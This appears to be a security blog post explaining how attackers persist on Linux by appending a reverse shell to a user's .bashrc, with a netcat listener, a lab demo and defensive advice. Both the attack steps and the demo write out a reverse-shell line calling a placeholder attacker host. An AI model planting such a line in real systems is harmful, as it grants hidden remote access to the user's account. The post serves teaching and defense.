# Bashrc Backdoors: Persistence Through a Hidden Terminal Trap

Hey cybersecurity folks! 👋  

Welcome back to another episode of **“What did the attacker leave behind?”** 🎭  
Today, we’re exploring a stealthy persistence trick attackers love to hide in plain sight: **the `.bashrc` backdoor**.

Why is it dangerous? Because it blends in with everyday shell configuration files — the ones users *trust* but rarely inspect.  

Whether you’re sharpening red team skills, brushing up on blue team defenses, or just geeking out over elegant persistence, this one’s for you. 🚀

## 🔍 What Is a Bashrc Backdoor?

A **bashrc backdoor** is a persistence method that abuses the `.bashrc` file — the script Bash runs every time a new **interactive shell** is launched.  

Attackers append a reverse shell payload to it, so whenever the user opens a terminal, the system silently connects back to the attacker.  

It’s like leaving a bug in someone’s coffee cup: subtle, invisible, and only activated when they take a sip. ☕🐛

## 🧠 Understanding `.bashrc`

- Location: `~/.bashrc` (per user)  
- Executes: whenever a **non-login interactive shell** starts  
- Usual purpose: aliases, prompt tweaks, environment variables  
- Hidden danger: it can run **any shell command**, even malicious ones  

That flexibility makes `.bashrc` a perfect persistence target.

## 🧰 The Attack: Step-by-Step

Here’s how an attacker might weaponize `.bashrc`:  

### ✅ Step 1: Initial Access  
The attacker first compromises the system (via exploit, weak creds, phishing, etc.).  

### ✅ Step 2: Payload Injection  
They append a reverse shell payload to the target user’s `.bashrc`:  

```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /home/alice/.bashrc
```

Every time **Alice** opens a terminal, the reverse shell fires.  

### ✅ Step 3: Listener Setup  
On the attacker’s machine:  

```bash
nc -lvnp 4444
```

Netcat listens for incoming connections.  

### ✅ Step 4: Trigger  
Hours later, Alice logs in and opens a shell.  

💥 Boom — instant reverse shell connection for the attacker.

## 🔁 Attack Flow Recap

| Step              | Action                                           |
|-------------------|-------------------------------------------------|
| 🎯 Initial Access | Attacker compromises target                     |
| 🐚 Inject Shell   | Reverse shell added to `.bashrc`                |
| 🎧 Listener       | Netcat listening on attacker’s machine           |
| 🔓 Trigger        | User opens terminal, payload executes           |
| 🧠 Access Regained| Attacker reconnects as that user                 |

---

## 🕵️ Why It’s Sneaky  

✅ Blends into a legitimate config file  
✅ Doesn’t create new files or binaries  
✅ Triggers only on user interaction  
✅ Often overlooked during forensics  

For sysadmins or developers who open terminals all day, this trick is especially effective.  

---

## 🧪 Lab Example (Safe Demo)

**On attacker machine:**  
```bash
nc -lvnp 4444
```

**On target machine:**  
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> ~/.bashrc
bash
```

➡️ Reverse shell pops to the attacker as soon as the victim starts Bash.

## ⚠️ Limitations  

- ❌ Only works when the user opens a shell  
- ❌ Easy to spot if `.bashrc` is inspected  
- ❌ Breaks if user switches shells (e.g., zsh, fish)  
- ❌ Detected by file integrity monitoring tools  

---

## 🛡️ Defense Strategies  

- **Audit Config Files:**  
  Regularly check `.bashrc`, `.profile`, `.bash_profile` for strange entries  
  Use integrity monitoring tools (AIDE, Tripwire, etc.)  

- **Monitor Network Traffic:**  
  Flag unusual outbound connections, especially from `bash` or `nc` processes  

- **User Awareness:**  
  Train users to report slow logins, weird prompts, or unexplained network activity  

---

## 🧠 Final Thoughts  

The `.bashrc` backdoor is simple, elegant, and effective. It requires no malware, no rootkits, just a clever abuse of Linux behavior.  

- For red teamers: a useful persistence trick.  
- For defenders: a reminder that **configuration files are attack surfaces too**.  
- For learners: an eye-opening way to understand subtle persistence methods.

Stay curious. Stay ethical. And always check your `.bashrc`. 😉
